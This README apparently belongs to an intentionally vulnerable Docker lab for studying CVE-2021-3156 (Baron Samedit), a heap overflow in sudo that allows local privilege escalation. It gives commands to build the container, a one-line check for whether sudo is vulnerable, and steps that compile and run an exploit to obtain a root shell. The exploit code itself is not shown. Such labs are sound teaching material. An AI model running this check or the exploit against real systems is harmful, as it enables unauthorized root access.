# Baron Samedit Lab — CVE-2021-3156

Intentionally vulnerable lab designed to study local privilege escalation via a **heap buffer overflow** in `sudo` / `sudoedit`.

## Why Docker for this lab (and not QEMU)?

Unlike PwnKit, Baron Samedit is a **userspace** bug in `sudo`.
It does not depend on `argc == 0` or the kernel. A simple Ubuntu 20.04 container running `sudo 1.8.31` is sufficient.

```
Kali Host
  └── Docker
        └── Ubuntu 20.04
              ├── sudo 1.8.31-1ubuntu1   ← vulnerable
              └── user lab / lab

```

## 1. Build and Start

```bash
cd baron-samedit-lab
sudo docker compose build
sudo docker compose run --rm target

```

You are logged in as `lab` (not root).

## 2. Verify the Target

```bash
sudo --version
# Sudo version 1.8.31

# Quick test: vulnerable if it prompts for a password or crashes;
# patched if it displays sudoedit usage.
sudoedit -s Y

```

## 3. Exploit

```bash
cd /opt/baron-lab
make
./exploit
id
# uid=0(root) gid=0(root) ...

```

Or in a single command:

```bash
cd /opt/baron-lab && ./run.sh

```

## 4. Stop

```bash
exit
# then
sudo docker compose down

```